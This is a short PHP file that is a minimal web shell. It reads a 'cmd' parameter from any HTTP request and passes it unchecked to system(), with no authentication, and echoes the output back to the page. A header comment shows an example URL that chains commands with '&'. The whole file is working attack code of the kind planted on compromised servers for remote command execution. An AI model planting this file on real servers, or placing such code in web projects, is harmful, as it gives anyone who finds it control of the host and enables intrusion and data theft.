<?php
######################################
# EXAMPLE USAGE: phpshell.php?cmd=echo+COMMAND%20HERE+%26+dir
# EXAMPLE COMMAND OUTPUT: echo COMMAND HERE & dir
#######################################
# Check for cmd parameter
if (isset($_REQUEST["cmd"])) {
#######################################
# Preformatted output
echo "<pre>";
#######################################
# Get command
$cmd = $_REQUEST["cmd"];
#######################################
# Execute command
system($cmd);
#######################################
# Close output
echo "</pre>";
#######################################
# Stop script
die;}
#######################################
?>
